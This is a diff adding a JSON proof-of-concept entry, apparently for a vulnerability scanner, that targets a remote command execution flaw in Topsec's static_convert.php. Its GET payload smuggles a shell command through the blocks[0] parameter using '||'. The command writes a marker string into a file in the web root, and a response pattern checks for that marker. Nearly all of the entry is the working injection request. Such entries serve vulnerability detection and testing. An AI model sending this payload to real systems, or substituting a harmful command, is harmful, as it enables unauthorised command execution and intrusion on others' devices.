@@ -1,0 +1,13 @@
+{
+	"name":"天融信TOPSEC_static_convert远程命令执行",
+	"tag":"topsec",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'pstvamqlkzrgslfilwvf'%20>>%20/var/www/html/rrlmkkyopirhaviko.txt%0A",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
+		},
+		"status_code":"200",
+		"pattern":"(pstvamqlkzrgslfilwvf)"
+	}
+}
